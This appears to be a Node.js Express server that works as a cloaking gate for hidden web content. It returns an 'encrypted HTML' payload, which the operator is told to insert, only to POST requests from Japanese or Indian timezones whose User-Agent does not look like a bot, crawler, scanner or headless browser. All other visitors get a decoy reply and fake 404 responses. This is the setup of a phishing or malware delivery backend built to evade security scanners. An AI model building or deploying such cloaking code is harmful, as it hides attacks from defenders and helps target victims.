const express = require("express");
const cors = require("cors");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const allowedTimezones = ["Asia/Tokyo", "Asia/Kolkata", "Asia/Calcutta"];
const encryptedPayload = encodeURIComponent(""); // ← Replace with your encrypted HTML

// ✅ Basic bot detection via User-Agent
function isLikelyBot(req) {
  const ua = req.headers["user-agent"] || "";
  const botPatterns = [
    /bot/i,
    /crawl/i,
    /spider/i,
    /preview/i,
    /fetch/i,
    /python/i,
    /node/i,
    /scrape/i,
    /headless/i,
    /monitor/i
  ];
  return botPatterns.some((pattern) => pattern.test(ua));
}

app.post("/", (req, res) => {
  const { timezone, fullUrl } = req.body;
  const userAgent = req.headers["user-agent"] || "";
  const referer = req.headers["referer"] || "";

  const isValidTimezone = allowedTimezones.includes(timezone);
  const hasFullUrl = typeof fullUrl === "string" && fullUrl.trim().length > 0;
  const isBot = isLikelyBot(req);

  const isAllowed = isValidTimezone && hasFullUrl && !isBot;

  console.table([
    {
      timezone,
      fullUrl,
      referer,
      userAgent,
      isValidTimezone,
      hasFullUrl,
      isBot,
      status: isAllowed ? "✅ ALLOWED" : "❌ BLOCKED"
    }
  ]);

  if (!isAllowed) {
    return res.send("hi how are you");
  }

  res.setHeader("Content-Type", "text/html");
  res.send(encryptedPayload);
});

// ❌ Catch-all GET route
app.get("*", (req, res) => {
  res.status(404).json({
    message: `Cannot GET ${req.originalUrl}`,
    error: "Not Found",
    statusCode: 404
  });
});

// ❌ Catch-all for other non-POST routes
app.use((req, res) => {
  res.status(404).json({
    message: `Cannot ${req.method} ${req.originalUrl}`,
    error: "Not Found",
    statusCode: 404
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
